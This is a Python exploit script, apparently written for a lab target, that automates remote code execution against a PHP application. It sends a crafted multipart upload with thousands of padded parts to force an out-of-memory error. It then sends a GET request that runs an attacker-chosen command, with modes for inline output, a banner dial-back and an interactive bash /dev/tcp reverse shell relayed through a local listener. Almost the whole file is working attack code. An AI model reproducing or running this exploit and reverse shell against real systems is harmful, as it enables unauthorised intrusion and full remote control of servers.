#!/usr/bin/env python3
"""cve2 venue RCE — manual playground.

Python-orchestrated version of tonight's manual recipe:
  reset markers -> ARM upload (expect silent 500) -> published-state marker
  -> listener up -> fire GET with c=<cmd> -> (shell relay | inline output)

Modes:
  python3 rce_shell.py                 interactive typing shell (sh -i over
                                       the dial-back; your stdin <-> socket)
  python3 rce_shell.py --cmd 'id'      run cmd, output comes back inline in
                                       the HTTP response (no listener needed)
  python3 rce_shell.py --banner        dial-back banner (id/uid/host), no
                                       interactivity

Requires ssh access to the venue from wherever you run this (the script
ssh'es to .170 to reset/touch the /tmp markers). Attacker IP is auto-
detected via an unconnected UDP socket unless --attacker says otherwise.
"""
import argparse, os, select, socket, subprocess, sys, threading, time

VENUE = '192.168.51.170'
APPPORT = 18990
SID = 'warmup00000000000000000000'
BOUND = '------cve2rce'

def ssh(venue, cmd):
    return subprocess.run(['ssh', 'jacob@' + venue, cmd],
                          capture_output=True, text=True)

def attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 53))
        return s.getsockname()[0]
    except OSError:
        return '127.0.0.1'
    finally:
        s.close()

def arm_body(n=2500, fill=512):
    """Vendor-shape upload-progress arm: 2500 file parts with 512B field
    names push the progress-entry re-encode past memory_limit -> OOM
    bailout inside the parse window -> silent 500 on stock 8.3.6."""
    parts = ['--%s\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\narmsid0abcdef0123456789\r\n' % BOUND,
             '--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nk\r\n' % BOUND]
    for i in range(n):
        nm = ('u%d' % i).ljust(fill, 'A')
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"; filename="f.txt"\r\n'
                     'Content-Type: text/plain\r\n\r\nxxxxxxxx\r\n' % (BOUND, nm))
    return ''.join(parts).encode() + b'--' + BOUND.encode() + b'--\r\n'

def http_post(host, port, path, body, timeout=90):
    s = socket.create_connection((host, port), timeout=timeout)
    hdr = ('POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; '
           'boundary=%s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n') % (path, BOUND, len(body))
    try:
        s.sendall(hdr.encode() + body)
    except BrokenPipeError:
        pass
    data = b''
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    txt = data.decode('utf-8', 'replace')
    head = txt.split('\r\n', 1)[0] if txt else 'NO-REPLY'
    return head, txt.split('\r\n\r\n', 1)[-1] if '\r\n\r\n' in txt else ''

def http_get_async(host, port, path, box, timeout=1800):
    try:
        head, body = http_post(host, port, path, b'', timeout=timeout)
        box.append((head, body))
    except Exception as e:
        box.append(('ERR', str(e)))

def fire_path(cmd, sid):
    import urllib.parse
    return '/cve2_rce.php?' + urllib.parse.urlencode({'PHPSESSID': sid, 'c': cmd})

def main():
    ap = argparse.ArgumentParser(description='cve2 venue RCE playground')
    ap.add_argument('--cmd', help='run this command, output inline (no listener)')
    ap.add_argument('--banner', action='store_true', help='dial-back banner, no interactivity')
    ap.add_argument('--no-arm', action='store_true', help='skip the arm (control: expect idle)')
    ap.add_argument('--port', type=int, default=19998, help='dial-back listener port')
    ap.add_argument('--attacker', default=None, help='attacker IP (auto-detected)')
    ap.add_argument('--venue', default=VENUE)
    args = ap.parse_args()
    att = args.attacker or attacker_ip()

    print('[1] reset markers on %s' % args.venue)
    ssh(args.venue, 'sudo rm -f /tmp/cve2_ran /tmp/cve2_armed /tmp/sess/sess_armsid*')

    if not args.no_arm:
        print('[2] ARM upload (vendor-shape OOM, expect silent 500)...')
        head, _ = http_post(args.venue, APPPORT, '/cve2_app.php', arm_body())
        print('    R1 ->', head)
        if '500' not in head:
            print('    WARN: arm did not fire (survived the storm); gate may not engage.')
        ssh(args.venue, 'sudo touch /tmp/cve2_armed')
    else:
        print('[2] arm skipped (control)')

    if args.cmd is not None:
        print('[3] fire GET c=%r (inline mode)' % args.cmd)
        head, body = http_post(args.venue, APPPORT, fire_path(args.cmd, SID), b'', timeout=60)
        print('    R2 ->', head)
        print('    body:', body.strip().replace('\n', ' | ')[:400] or '(empty)')
        return

    if args.banner:
        cmd = ("/bin/bash -c 'exec 3<>/dev/tcp/%s/%d; echo \"$(id -un) uid=$(id -u) "
               "host=$(hostname) arch=$(uname -m)\" >&3; echo CVE2-DIALBACK-EOF >&3; exit'"
               % (att, args.port))
    else:
        cmd = "/bin/bash -c 'exec 3<>/dev/tcp/%s/%d; sh -i <&3 >&3 2>&3'" % (att, args.port)

    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(('0.0.0.0', args.port)); ls.listen(1); ls.settimeout(20)
    print('[3] listener :%d  —  firing GET (curl-equivalent)' % args.port)
    box = []
    th = threading.Thread(target=http_get_async,
                          args=(args.venue, APPPORT, fire_path(cmd, SID), box), daemon=True)
    th.start()
    try:
        conn, _ = ls.accept()
    except socket.timeout:
        th.join(timeout=3)
        print('    no dial-back.', (box[0][1].strip()[:120] if box else ''))
        ls.close(); return
    ls.close()
    peer = conn.getpeername()
    print('    dialed back from %s:%d%s' % (peer[0], peer[1],
          ' — relay live (type; Ctrl-D to drop)' if not args.banner else ''))
    if args.banner:
        data = b''
        conn.settimeout(10)
        while b'CVE2-DIALBACK-EOF' not in data:
            c = conn.recv(4096)
            if not c:
                break
            data += c
        sys.stdout.write(data.decode('utf-8', 'replace'))
        sys.stdout.flush()
        conn.close()
    else:
        conn.setblocking(False)
        fdin = sys.stdin.fileno()
        cfd = conn.fileno()
        try:
            while True:
                r, _, _ = select.select([fdin, cfd], [], [], 30)
                if cfd in r:
                    try:
                        d = conn.recv(4096)
                    except OSError:
                        break
                    if not d:
                        break
                    os.write(1, d)
                if fdin in r:
                    b = os.read(fdin, 1024)
                    if not b:
                        try:
                            conn.shutdown(socket.SHUT_WR)
                        except OSError:
                            pass
                        break
                    conn.sendall(b)
        finally:
            try:
                conn.close()
            except OSError:
                pass
    th.join(timeout=10)
    if box:
        head, body = box[0]
        print('[4] R2 ->', head)
        print('    body:', body.strip().replace('\n', ' | ')[:300] or '(empty)')
    ssh(args.venue, 'sudo rm -f /tmp/cve2_ran')

if __name__ == '__main__':
    main()
